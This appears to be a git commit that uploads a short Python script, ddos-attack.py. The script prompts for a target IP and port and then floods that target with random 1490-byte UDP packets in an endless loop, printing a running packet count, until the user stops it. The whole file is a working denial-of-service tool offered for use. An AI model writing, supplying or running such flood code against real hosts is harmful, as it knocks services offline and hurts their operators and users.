3371768a9b8a49189396ccf7358f781383497dba
LunarStone292 <93814414+LunarStone292@users.noreply.github.com>
2023-03-12 18:05:32 +0100

    Add files via upload

---
+++ ddos-attack.py
@@ -0,0 +1,29 @@
+import os
+import socket
+import random
+from src import banner, clean
+
+if __name__ == "__main__":
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
+
+        clean.clear()
+
+        ip = input("IP Target => ")
+        port = int(input("Port      => "))
+
+        clean.clear()
+        banner.banner()
+
+        sent = 0
+        while True:
+             sock.sendto(bytes, (ip,port))
+             sent = sent + 1
+             if(sent % 5000 == 0):
+                 print(str(sent) + " sockets sent")
+    except KeyboardInterrupt:
+        print("\nArresting the attack...")
+        sock.close()
+        exit()
+
